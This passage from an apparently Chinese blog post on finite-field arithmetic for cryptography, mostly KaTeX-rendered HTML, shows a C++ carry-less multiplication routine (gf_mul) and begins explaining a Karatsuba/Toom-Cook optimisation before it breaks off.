class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">0</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord\"><span class=\"mord mathnormal\">b</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">2</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">a</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">1</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord\"><span class=\"mord mathnormal\">b</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">1</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mclose\">)</span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.10903em;\">M</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8641079999999999em;\"><span style=\"top:-3.113em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">2</span></span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mopen\">(</span><span class=\"mord\"><span class=\"mord mathnormal\">a</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">1</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord\"><span class=\"mord mathnormal\">b</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">0</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">a</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">0</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord\"><span class=\"mord mathnormal\">b</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">1</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mclose\">)</span><span class=\"mord mathnormal\" style=\"margin-right:0.10903em;\">M</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">a</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">0</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord\"><span class=\"mord mathnormal\">b</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">0</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.274108em;\"><span></span></span></span></span></span></span></span></span></span></span></span></p>\n<p>观察到 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi>a</mi><mi>i</mi></msub><msub><mi>b</mi><mi>j</mi></msub><msup><mi>M</mi><mi>k</mi></msup></mrow><annotation encoding=\"application/x-tex\">a_ib_jM^k</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1.135216em;vertical-align:-0.286108em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">a</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.31166399999999994em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">i</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord\"><span class=\"mord mathnormal\">b</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.311664em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.05724em;\">j</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.286108em;\"><span></span></span></span></span></span></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.10903em;\">M</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.849108em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.03148em;\">k</span></span></span></span></span></span></span></span></span></span></span> 满足 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>i</mi><mo>+</mo><mi>j</mi><mo>=</mo><mi>k</mi></mrow><annotation encoding=\"application/x-tex\">i+j=k</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.74285em;vertical-align:-0.08333em;\"></span><span class=\"mord mathnormal\">i</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.85396em;vertical-align:-0.19444em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.05724em;\">j</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.69444em;vertical-align:0em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.03148em;\">k</span></span></span></span>，所以我自己实现的不经过优化的分组乘法如下：</p>\n<p><figure class=\"highlight cpp\"><figcaption><span>cpp</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// c = a * b</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">inline</span> <span class=\"type\">void</span> <span class=\"title\">gf_mul</span><span class=\"params\">(<span class=\"type\">uint64_t</span> c[<span class=\"number\">3</span>], <span class=\"type\">const</span> <span class=\"type\">uint64_t</span> a[<span class=\"number\">3</span>], <span class=\"type\">const</span> <span class=\"type\">uint64_t</span> b[<span class=\"number\">3</span>])</span></span>&#123;</span><br><span class=\"line\">    <span class=\"type\">uint64_t</span> e[<span class=\"number\">6</span>] = &#123;<span class=\"number\">0</span>&#125;;</span><br><span class=\"line\">    __m128i a_tmp, b_tmp, tmp;</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(<span class=\"type\">int</span> i=<span class=\"number\">0</span>; i&lt;<span class=\"number\">3</span>; ++i)&#123;</span><br><span class=\"line\">        a_tmp = _mm_set_epi64x(<span class=\"number\">0</span>, a[i]);</span><br><span class=\"line\">        <span class=\"keyword\">for</span>(<span class=\"type\">int</span> j=<span class=\"number\">0</span>; j&lt;<span class=\"number\">3</span>; ++j)&#123;</span><br><span class=\"line\">            b_tmp = _mm_set_epi64x(<span class=\"number\">0</span>, b[j]);</span><br><span class=\"line\">            tmp = _mm_clmulepi64_si128(a_tmp, b_tmp, <span class=\"number\">0x00</span>);</span><br><span class=\"line\">            e[i + j] ^= _mm_cvtsi128_si64(tmp);</span><br><span class=\"line\">            e[i + j + <span class=\"number\">1</span>] ^= _mm_extract_epi64(tmp, <span class=\"number\">1</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"built_in\">gf_mod</span>(c, e);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>在这里一共做了 9 次 SMI 乘法、18 次异或运算。因为两个相乘数均被分为 3 部分，乘法一共需要进行 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mn>3</mn><mo>×</mo><mn>3</mn><mo>=</mo><mn>9</mn></mrow><annotation encoding=\"application/x-tex\">3\\times3=9</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.72777em;vertical-align:-0.08333em;\"></span><span class=\"mord\">3</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">×</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.64444em;vertical-align:0em;\"></span><span class=\"mord\">3</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.64444em;vertical-align:0em;\"></span><span class=\"mord\">9</span></span></span></span> 次，每次乘法得到 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi>a</mi><mi>i</mi></msub><msub><mi>b</mi><mi>j</mi></msub></mrow><annotation encoding=\"application/x-tex\">a_ib_j</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.980548em;vertical-align:-0.286108em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">a</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.31166399999999994em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">i</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord\"><span class=\"mord mathnormal\">b</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.311664em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.05724em;\">j</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.286108em;\"><span></span></span></span></span></span></span></span></span></span> 包含低 64 位和高 64 位两部分结果，需要分开加到乘法结果中，所以一共需要进行 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mn>3</mn><mo>×</mo><mn>3</mn><mo>×</mo><mn>2</mn><mo>=</mo><mn>18</mn></mrow><annotation encoding=\"application/x-tex\">3\\times3\\times2=18</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.72777em;vertical-align:-0.08333em;\"></span><span class=\"mord\">3</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">×</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.72777em;vertical-align:-0.08333em;\"></span><span class=\"mord\">3</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">×</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.64444em;vertical-align:0em;\"></span><span class=\"mord\">2</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.64444em;vertical-align:0em;\"></span><span class=\"mord\">1</span><span class=\"mord\">8</span></span></span></span> 次异或运算。</p>\n<p>实际上其中一个异或 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi>e</mi><mn>5</mn></msub><mo>=</mo><mo stretchy=\"false\">(</mo><msub><mi>a</mi><mn>2</mn></msub><mo>×</mo><msub><mi>b</mi><mn>2</mn></msub><msub><mo stretchy=\"false\">)</mo><mtext>high 64 bits</mtext></msub></mrow><annotation encoding=\"application/x-tex\">e_5=(a_2\\times b_2)_{\\text{high 64 bits}}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.58056em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">e</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">5</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mopen\">(</span><span class=\"mord\"><span class=\"mord mathnormal\">a</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">2</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">×</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1.036108em;vertical-align:-0.286108em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">b</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">2</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mclose\"><span class=\"mclose\">)</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3361079999999999em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord text mtight\"><span class=\"mord mtight\">high 64 bits</span></span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.286108em;\"><span></span></span></span></span></span></span></span></span></span> 是不需要的，因为这一部分一定是 0，但是形式上保留的话会使代码更简洁。</p>\n<h2 id=\"karatsuba\"><a class=\"anchor\" href=\"#karatsuba\">#</a> Karatsuba</h2>\n<p>参考论文中的伪代码：</p>\n<p><img data-src=\"/assets/math/cryptography/finite-field/3.png\" alt=\"\" /></p>\n<p>我接着按照论文的伪代码实现了 Toom-cook 3-way 算法，或者说 Karatsuba 算法优化后的版本。这个优化的本质实际上就是通过增加加减法运算的次数，减少乘法运算的次数。对于分为 3 组的我们的情况，就可以将 9 次乘法运算减少到 6 次乘法运算。</p>\n<p>优化原理在于，对于分组表示的数：</p>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\" display=\"block\"><semantics><mrow><mi>a</mi><mo>=</mo><msub><mi>a</mi><mn>2</mn></msub><msup><mi>M</mi><mn>2</mn></msup><mo>+</mo><msub><mi>a</mi><mn>1</mn></msub><mi>M</mi><mo>+</mo><msub><mi>a</mi><mn>0</mn></msub><mspace linebreak=\"newline\"></mspace><mi>b</mi><mo>=</mo><msub><mi>b</mi><mn>2</mn></msub><msup><mi>M</mi><mn>2</mn></msup><mo>+</mo><msub><mi>b</mi><mn>1</mn></msub><mi>M</mi><mo>+</mo><msub><mi>b</mi><mn>0</mn></msub></mrow><annotation encoding=\"application/x-tex\">a=a_{2}M^{2}+a_{1}M+a_{0}\\\\\nb=b_{2}M^{2}+b_{1}M+b_{0}\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">a</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1.0141079999999998em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">a</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">2</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.10903em;\">M</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8641079999999999em;\"><span style=\"top:-3.113em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">2</span></span></span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.83333em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">a</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">1</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord mathnormal\" style=\"margin-right:0.10903em;\">M</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.58056em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">a</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">0</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span><span class=\"mspace newline\"></span><span class=\"base\"><span class=\"strut\" style=\"height:0.69444em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">b</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1.0141079999999998em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">b</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">2</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.10903em;\">M</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8641079999999999em;\"><span style=\"top:-3.113em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">2</span></span></span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.84444em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">b</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">1</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord mathnormal\" style=\"margin-right:0.10903em;\">M</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.84444em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">b</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">0</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span></span></p>\n<p>乘法运算有：</p>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\" display=\"block\"><semantics><mtable rowspacing=\"0.24999999999999992em\" columnalign=\"right left\" columnspacing=\"0em\"><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mi>a</mi><mo>×</mo><mi>b</mi><mo>=</mo></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mrow></mrow><mo stretchy=\"false\">(</mo><msub><mi>a</mi><mn>2</mn></msub><msup><mi>M</mi><mn>2</mn></msup><mo>+</mo><msub><mi>a</mi><mn>1</mn></msub><mi>M</mi><mo>+</mo><msub><mi>a</mi><mn>0</mn></msub><mo stretchy=\"false\">)</mo><mo>×</mo><mo stretchy=\"false\">(</mo><msub><mi>b</mi><mn>2</mn></msub><msup><mi>M</mi><mn>2</mn></msup><mo>+</mo><msub><mi>b</mi><mn>1</mn></msub><mi>M</mi><mo>+</mo><msub><mi>b</mi><mn>0</mn></msub><mo stretchy=\"false\">)</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mo lspace=\"0em\" rspace=\"0em\">=</mo></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" 